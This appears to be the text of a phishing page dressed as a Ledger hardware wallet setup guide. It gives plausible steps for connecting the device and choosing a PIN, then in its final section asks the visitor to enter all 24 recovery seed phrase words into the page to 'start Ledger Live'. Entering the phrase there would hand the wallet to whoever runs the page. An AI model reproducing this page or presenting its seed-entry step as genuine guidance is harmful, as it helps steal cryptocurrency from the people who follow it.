1GET STARTED

THE BEST WAY TO GET YOU STARTED:

  • 1
    Turn on Device

    Connect your device to your computer with the USB cable.

  • 2
    Browse

    Learn how to interact with your device by reading the on-screen instructions.

  • 3
    Select Option On Screen

    Press both buttons simultaneously to validate the selection.

  • 4
    Keep Your Recovery Phrase

    Click on NEXT - Follow instructions on your Device.

2PIN CODE

PIN CODE

Your PIN code is the first layer of security. It physically secures access to your private key and your Ledger. Your PIN code must be 4 to 8 digits long.

I understand that i must choose my PIN code myself and keep it private.
4VERIFY RECOVERY PHRASE

VERIFY SEED PHRASE OF YOUR DEVICE

Enter your Recovery Seed Phrase Words to Import & Download Your Wallet App.
**Ledger does not keep a copy of your recovery phrase.
**ENTER 24 SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.
